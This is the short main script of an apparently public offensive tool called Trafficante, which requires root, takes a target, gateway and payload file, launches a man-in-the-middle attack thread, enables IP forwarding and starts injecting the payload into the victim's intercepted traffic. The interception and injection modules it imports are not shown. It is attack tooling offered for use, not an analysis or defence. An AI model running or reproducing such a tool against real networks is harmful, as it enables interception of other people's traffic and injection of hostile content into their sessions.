# github.com/n0nexist/Trafficante

import modules.utils as utils
import modules.injector as inj
import modules.mitm as mitm
from threading import Thread as th

utils.checkroot()
utils.cls()
utils.logo()

target, gateway, payloadfile = utils.args()

th(target=mitm.start_mitm,args=(target, gateway,)).start()
utils.enable_forwarding()
th(target=inj.start_injecting,args=(payloadfile,)).start()